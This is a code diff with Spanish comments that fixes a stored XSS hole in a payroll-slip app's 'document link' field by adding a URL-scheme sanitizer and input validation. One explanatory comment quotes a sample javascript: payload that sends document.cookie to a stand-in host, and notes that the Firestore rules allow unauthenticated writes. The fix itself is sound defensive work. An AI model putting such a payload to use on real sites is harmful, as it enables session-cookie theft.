@@ -5684,6 +5684,28 @@
             return String(str || '').replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
         }
 
+        // BUG CORREGIDO (auditoría 20/09, ronda 5 — XSS almacenado): "Enlace del documento" de un
+        // desprendible de pago es texto libre que Admin escribe (pensado para un link de Google Drive),
+        // y se renderizaba como href="${escapeHtml(d.enlace_documento)}" en el historial de Admin, y
+        // como .href = data.enlace_documento en la página pública de firma (sin login — cualquiera con
+        // el enlace de firma la ve). escapeHtml() solo neutraliza & < > " ' — NO bloquea el ESQUEMA de
+        // la URL, así que un valor como "javascript:fetch('https://x/robar?c='+document.cookie)" pasaba
+        // intacto: al hacer clic en "Ver documento original" se ejecutaba ese código dentro de la app,
+        // con la sesión de quien clickeó (potencialmente un Admin autenticado revisando el historial).
+        // Y como firestore.rules permite "create: if true" en /desprendibles/ (a propósito, para poder
+        // crear el enlace de firma sin depender de que el firmante inicie sesión — ver ese archivo),
+        // CUALQUIERA sin login podía escribir ese campo directo contra Firestore, sin pasar por la app.
+        // Esta función es la única puerta para convertir un texto libre en un href seguro: solo deja
+        // pasar http:// y https:// (lo único que un enlace real a un documento necesita); cualquier
+        // otro esquema (javascript:, data:, vbscript:, etc.) o texto que no parezca una URL se cambia
+        // por "#" — el enlace queda inofensivo en vez de roto, para no tumbar la pantalla si el dato
+        // viejo ya tenía basura.
+        function sanitizeUrl(url) {
+            const s = String(url || '').trim();
+            if (/^https?:\/\//i.test(s)) return s;
+            return '#';
+        }
+
         // BUG CORREGIDO (reportado por el usuario: "Copiar enlace" falla en PC, funciona bien en móvil):
         // navigator.clipboard.writeText() puede fallar en computador por varias razones ajenas al enlace en
         // sí — la más común es que el navegador exige que la PESTAÑA tenga el foco en ese instante, y si
@@ -6628,13 +6650,23 @@
 
             try {
                 const nombreTrabajador = document.getElementById('desp-trabajador').value.trim();
+                const enlaceDocumento = document.getElementById('desp-enlace-documento').value.trim();
+                // BUG CORREGIDO (auditoría 20/09, ronda 5 — XSS almacenado): este campo se renderiza
+                // después como href tanto en el historial de Admin como en la página pública de firma
+                // (ver sanitizeUrl(), más arriba). Se valida aquí también, en el origen, para no guardar
+                // nunca un esquema peligroso (javascript:, data:, etc.) aunque alguien lo escriba a mano
+                // por error — no solo confiar en la sanitización de la pantalla.
+                if (enlaceDocumento && !/^https?:\/\//i.test(enlaceDocumento)) {
+                    btn.innerHTML = originalHTML; btn.disabled = false;
+                    return UI.showAlert("Enlace inválido", "El enlace del documento debe empezar con http:// o https:// (por ejemplo, un link de Google Drive). Revisa que lo hayas pegado completo.", "error");
+                }
                 const data = {
                     trabajador: nombreTrabajador,
                     trabajador_cedula: empleadosNombreCedula[nombreTrabajador.toUpperCase()] || null,
                     nomina_numero: document.getElementById('desp-nomina-numero').value.trim(),
                     periodo_inicio: document.getElementById('desp-periodo-inicio').value,
                     periodo_fin: document.getElementById('desp-periodo-fin').value,
-                    enlace_documento: document.getElementById('desp-enlace-documento').value.trim(),
+                    enlace_documento: enlaceDocumento,
                     firma: null, firmado: false, firmado_en: null,
                     estado: 'pendiente',
                     creado_por: auth.currentUser?.email || 'desconocido',
@@ -6765,7 +6797,7 @@
                         ${badge}
                     </div>
                     <div id="detalle-desp-${d.id}" class="hidden mt-3 pt-3 border-t border-slate-100 flex flex-col gap-2">
-                        <a href="${escapeHtml(d.enlace_documento)}" target="_blank" rel="noopener" class="text-xs font-bold text-blue-600 underline flex items-center gap-1"><i class="ph-bold ph-file-text"></i> Ver documento original</a>
+                        <a href="${escapeHtml(sanitizeUrl(d.enlace_documento))}" target="_blank" rel="noopener" class="text-xs font-bold text-blue-600 underline flex items-center gap-1"><i class="ph-bold ph-file-text"></i> Ver documento original</a>
                         ${firmado
                             ? `<img src="${d.firma}" class="w-full h-16 object-contain bg-slate-50 rounded border border-slate-200 mt-1">
                                <p class="text-[10px] text-slate-500">Firmado por ${escapeHtml(d.firmado_por) || escapeHtml(d.trabajador)} el ${d.firmado_en ? new Date(d.firmado_en).toLocaleString('es-CO') : ''}</p>`
@@ -6883,7 +6915,7 @@
                 document.getElementById('desp-firmar-trabajador').textContent = data.trabajador || '—';
                 document.getElementById('desp-firmar-numero').textContent = data.nomina_numero || '—';
                 document.getElementById('desp-firmar-periodo').textContent = `${data.periodo_inicio || ''} a ${data.periodo_fin || ''}`;
-                document.getElementById('desp-firmar-link-doc').href = data.enlace_documento || '#';
+                document.getElementById('desp-firmar-link-doc').href = sanitizeUrl(data.enlace_documento);
 
                 const verificacionBox = document.getElementById('desp-verificacion-box');
                 const pendienteBox = document.getElementById('desp-pendiente-box');
